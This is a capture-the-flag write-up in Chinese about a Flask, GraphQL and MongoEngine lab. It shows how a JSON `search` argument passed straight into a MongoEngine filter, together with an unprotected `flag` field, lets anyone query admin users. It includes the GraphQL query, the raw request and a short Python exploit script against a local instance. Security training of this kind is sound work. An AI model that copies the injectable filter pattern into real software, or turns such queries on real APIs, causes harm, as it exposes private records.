## 1、题目描述

本题为一个基于 Flask + GraphQL + MongoEngine 的 Web 应用，用户可通过 `/graphql` 接口查询用户信息。数据库中有管理员用户，且管理员用户的 `flag` 字段存储了 flag。flag 通过环境变量注入，非假 flag 格式为 uuid。

## 2、知识点

- GraphQL 查询注入
- MongoEngine 查询语法
- Python 动态参数解析
- JSON 反序列化
- 信息泄露

## 3、题目解题方法思路

### 解题关键路径

- `/graphql` 接口允许自定义 `search` 参数，且该参数会被 `json.loads` 反序列化后直接传入 `query.filter(**search_criteria)`，存在 NoSQL 注入风险。
- `UserType` 直接暴露了 `flag` 字段，且未做权限校验。
- 只需构造合适的 GraphQL 查询，配合 `search` 参数，查询 `is_admin=true` 的用户，即可获取管理员的 flag。

### 使用的工具和方法

- Burp Suite/Postman/curl/GraphQL Playground 等工具构造 GraphQL 查询
- 利用 GraphQL 的自定义参数和字段选择能力

## 4、解题步骤

### 步骤一：分析 GraphQL 查询结构

根据 schema.py，`users` 查询支持 `search` 参数，且 `UserType` 可直接查询 `flag` 字段。

### 步骤二：构造 GraphQL 查询

目标：查询所有管理员用户的 flag。

GraphQL 查询示例：

```graphql
query getFlag($search: String) {
  users(search: $search) {
    username
    email
    flag
  }
}
```

变量：

```json
{
  "search": "{\"is_admin\": true}"
}
```

### 步骤三：发送请求

使用 curl/Postman/GraphQL Playground 发送如下 POST 请求到 `/graphql`：

```json
POST /graphql
Content-Type: application/json

{
  "query": "query getFlag($search: String) { users(search: $search) { username email flag } }",
  "variables": {
    "search": "{\"is_admin\": true}"
  }
}
```

### 步骤四：获取 flag

返回结果中，`flag` 字段即为管理员的 flag，格式为 uuid。

## 5、exp（最终拿到flag）

```python
import requests

url = "http://127.0.0.1:5003/graphql"
query = """
query getFlag($search: String) {
  users(search: $search) {
    username
    email
    flag
  }
}
"""
variables = {
    "search": "{\"is_admin\": true}"
}

resp = requests.post(url, json={"query": query, "variables": variables})
print(resp.json())
```

**返回示例：**

```json
{
  "data": {
    "users": [
      {
        "username": "admin",
        "email": "admin@heytheregotrythis.com",
        "flag": null
      },
      {
        "username": "admin2",
        "email": "admin2@goodyoutriedsomethingelse.com",
        "flag": "flag{ffllaagg}"
      }
    ]
  }
}
```

**flag 即为 `admin2` 用户的 `flag` 字段内容：**